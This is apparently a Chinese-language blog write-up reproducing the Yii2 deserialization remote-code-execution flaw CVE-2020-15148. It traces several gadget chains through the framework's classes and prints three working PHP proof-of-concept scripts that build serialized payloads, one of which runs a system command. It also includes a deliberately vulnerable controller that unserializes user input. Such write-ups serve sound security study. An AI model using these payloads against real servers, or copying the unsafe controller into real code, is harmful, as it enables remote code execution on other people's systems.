# Yii2框架 反序列化漏洞复现


### 前言

最近学习PHP反序列化遇到了Yii2反序列化得利用，就顺便搭一下环境，跟着网上各种师傅们的文章复现和学习，提高自己代码审计能力。

漏洞出现在yii2.0.38之前的版本中,在2.0.38进行了修复，CVE编号是CVE-2020-15148：

```
Yii 2 (yiisoft/yii2) before version 2.0.38 is vulnerable to remote code execution if the application calls unserialize() on arbitrary user input. This is fixed in version 2.0.38. A possible workaround without upgrading is available in the linked advisory.
```



#### Yii2介绍

Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。即可以用于开发各种用 PHP 构建的 Web 应用。因为基于组件的框架结构和设计精巧的缓存支持，它特别适合开发大型应用， 如门户网站、社区、内容管理系统（CMS）、 电子商务项目和 RESTful Web 服务等。

#### 环境搭建

windows10 phpstudy

yii2版本:2.037和2.0.38

php版本:7.3.4

修改`config\web.php`中的`cookieValidationKey`为任意值，作为`yii\web\request::cookieValidationKey`的加密值，不设置就会报错。

接着自己添加一个`controller`来进行漏洞的利用，创建一个action: http://url/index.php?r=test/test, controllers的命名是 : `名称Controller`，action的命名是: `action名称`，如下

`controllers/TestController.php`

```php
<?php

namespace app\controllers;

use yii\web\Controller;

class TestController extends Controller{
    public function actionTest($data){
        return unserialize(base64_decode($data));
    }
}
?>
```

发包测试，环境搭建成功

![](/yii2框架-反序列化漏洞复现/yii2-001.jpg)

### 2.3.07版本反序列化

##### POC1

漏洞的触发点在`\yii\vendor\yii2\db\BatchQueryResult.php`文件中，

```php
   public function __destruct()
    {
        // make sure cursor is closed
        $this->reset();
    }

    public function reset()
    {
        if ($this->_dataReader !== null) {
            $this->_dataReader->close();
        }
        $this->_dataReader = null;
        $this->_batch = null;
        $this->_value = null;
        $this->_key = null;
    }
```

可以看到，`__destruct`调用了`reset`方法 `reset`方法`reset`调用了`close`方法，参数 `_dataReader`可控。学习思路后知道这里可以通过触发 `__call`方法来进行利用

- __call:当一个对象在对象上下文中调用不可访问的方法时触发

当一个对象调用不可访问的`close`方法或者类中压根就没有`close`方法，即可触发 `__call`,全局搜索 `__call`方法

![](/yii2框架-反序列化漏洞复现/yii2-002.jpg)

```php
public function __call($method, $attributes)
{
   	return $this->format($method, $attributes);
}
public function format($formatter, $arguments = array())
{
    return call_user_func_array($this->getFormatter($formatter), $arguments);
}
public function getFormatter($formatter)
{
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);

                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
}

```

`__call`方法调用了类中的 `format`的方法，`format`方法里的 `call_user_func_array`里的参数调用了 `getFormatter`方法

- `call_user_func_array` :调用回调函数，并把一个数组参数作为回调函数的参数

  大致使用方法如下:

  ```php
  <?php
  function foobar($arg, $arg2) {
      echo __FUNCTION__, " got $arg and $arg2\n";
  }
  class foo {
      function bar($arg, $arg2) {
          echo __METHOD__, " got $arg and $arg2\n";
      }
  }
  
  
  // Call the foobar() function with 2 arguments
  call_user_func_array("foobar", array("one", "two"));
  
  // Call the $foo->bar() method with 2 arguments
  $foo = new foo;
  call_user_func_array(array($foo, "bar"), array("three", "four"));
  ?>
  ```

`getFormatter`方法从 `$this->formatter`可控，所以这里可以调用任意类中的任意方法了。

![](/yii2框架-反序列化漏洞复现/yii2-003.jpg)

但是 `$arguments`是从 `yii\db\BatchQueryResult::reset()`里传过来的，我门不可控，比如这里就为空，因为传来的 `close`方法中传参数值，所以我们只能不带参数地去调用别的类中的方法。

到这一步就需要一个执行类，这时候需要类中的方法需要满足两个条件

1. 方法所需的参数只能是其自己类中存在的(即参数: `$this->args`)
2. 方法需要有命令执行功能

通过全局查找正则匹配 `call_user_func\(\$this->([a-zA-Z0-9]+), \$this->([a-zA-Z0-9]+)`来查找，结果如下

![](/yii2框架-反序列化漏洞复现/yii2-004.jpg)

- `call_user_func` :把第一个参数作为回调函数用，这里用 `call_user_func`即可达到命令执行的效果也可以达到 `RCE` 的效果

大致使用方法如下

```
<?php
error_reporting(E_ALL);
function increment(&$var)
{
    $var++;
}

$a = 0;
call_user_func('increment', $a);
echo $a."\n";

call_user_func_array('increment', array(&$a)); // You can use this instead before PHP 5.3
echo $a."\n";
?>
```

其中有两个类中的 `run`方法可用

1.  `yii\rest\CreateAction::run()` ，`$this->id`两个参数可控

   ```php
   public function run()
       {
           if ($this->checkAccess) {
               call_user_func($this->checkAccess, $this->id);
           }  //主要还是看这里
   
           /* @var $model \yii\db\ActiveRecord */
           $model = new $this->modelClass([
               'scenario' => $this->scenario,
           ]);
   
           $model->load(Yii::$app->getRequest()->getBodyParams(), '');
           if ($model->save()) {
               $response = Yii::$app->getResponse();
               $response->setStatusCode(201);
               $id = implode(',', array_values($model->getPrimaryKey(true)));
               $response->getHeaders()->set('Location', Url::toRoute([$this->viewAction, 'id' => $id], true));
           } elseif (!$model->hasErrors()) {
               throw new ServerErrorHttpException('Failed to create the object for unknown reason.');
           }
   
           return $model;
       }
   ```

2.  `\yii\rest\IndexAction::run()`, `$this->checkAccess,$this->id`两个参数可控

   ```php
       public function run()
       {
           if ($this->checkAccess) {
               call_user_func($this->checkAccess, $this->id);
           }
   
           return $this->prepareDataProvider();
       }
   ```

于是就可以构造完整的 `pop`链

```php
yii\db\BatchQueryResult::__destruct()->reset()->close()
->
Faker\Generator::__call()->format()->call_user_func_array()
->
\yii\rest\IndexAction::run->call_user_func()
```

Exp

```php
<?php
namespace yii\rest{
    class IndexAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';           //command
        }
    }
}

namespace Faker{
    use yii\rest\IndexAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new IndexAction, 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

成功RCE了

![](/yii2框架-反序列化漏洞复现/yii2-005.jpg)

### 2.3.08版本反序列化

利用链的起点\yii\vendor\codeception\codeception\ext\RunProcess.php

```php
    public function __destruct()
    {
        $this->stopProcess();
    }

    public function stopProcess()
    {
        foreach (array_reverse($this->processes) as $process) {
            /** @var $process Process  **/
            if (!$process->isRunning()) {
                continue;
            }
            $this->output->debug('[RunProcess] Stopping ' . $process->getCommandLine());
            $process->stop();
        }
        $this->processes = [];
    }
```

同样还是找 `__destruct()`方法调用了 `stopProcess`函数，因为这里的 `$this->processes`可控，也就意味着 `process`可控，然后下面又调用了 `process->isRunning`,可以接上第一条利用链的 `__call`方法开头的后半段。

##### 利用链1

`Codeception\Extension\RunProcess::__destruct()->Faker\Genrator::__call()->yii\rest\IndexAction::run()`

##### Poc2

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new Generator()];
        }
    }
}
namespace{
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?>
```

运行poc，成功RCE了

![](/yii2框架-反序列化漏洞复现/yii2-006.jpg)

##### 利用链2

`\yii\vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php`文件中，

```php
public function __destruct()
    {
        foreach ($this->keys as $nsKey => $null) {
            $this->clearAll($nsKey);
        }
    }
```

跟进 `clearAll`方法

```php
    public function clearAll($nsKey)
    {
        if (array_key_exists($nsKey, $this->keys)) {
            foreach ($this->keys[$nsKey] as $itemKey => $null) {
                $this->clearKey($nsKey, $itemKey);
            }
            if (is_dir($this->path.'/'.$nsKey)) {
                rmdir($this->path.'/'.$nsKey);
            }
            unset($this->keys[$nsKey]);
        }
    }
```

这里的`this->keys`以及`$nsKey、$itemKey`都是我们可控的，所以是可以执行到`$this->clearKey`的，跟进看看:

```php
    public function clearKey($nsKey, $itemKey)
    {
        if ($this->hasKey($nsKey, $itemKey)) {
            $this->freeHandle($nsKey, $itemKey);
            unlink($this->path.'/'.$nsKey.'/'.$itemKey);
        }
    }
```

这里的`$this->path`也可控，可以看到这里是进行了一个字符串拼接操作，那么意味着可以利用魔术方法`__toString`来触发后续操作。

全局搜索`__toString`

文件路径`\yii\vendor\phpdocumentor\reflection-docblock\src\DocBlock\Tags\see.php`

使用`See.php`举例

```php
public function __toString() : string
    {
        return $this->refers . ($this->description ? ' ' . $this->description->render() : '');
    }
```

可以看到`$this->description`可控，又可以利用 `__call`

利用链3

```php
Swift_KeyCache_DiskKeyCache -> phpDocumentor\Reflection\DocBlock\Tags\See::__toString()-> Faker\Generator::__call() -> yii\rest\IndexAction::run()
```

##### POC3

```php
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'phpinfo';
            $this->id = '1';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this->path = new See;
            $this->keys = array(
                "axin"=>array("is"=>"handsome")
            );
        }
    }
    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?>
```

![](/yii2框架-反序列化漏洞复现/yii2-007.jpg)

### 小结

- 发现这几个pop链用来用去最后都是靠着`__call`方法来触发代码执行。
- 找链子的开端可以尝试从`__destruct`入手，然后追链，追方法
- `__call_user_func`中的`callback`可以是数组
- 2.0.38还有2个链子没弄
- 2.0.42还有链子....


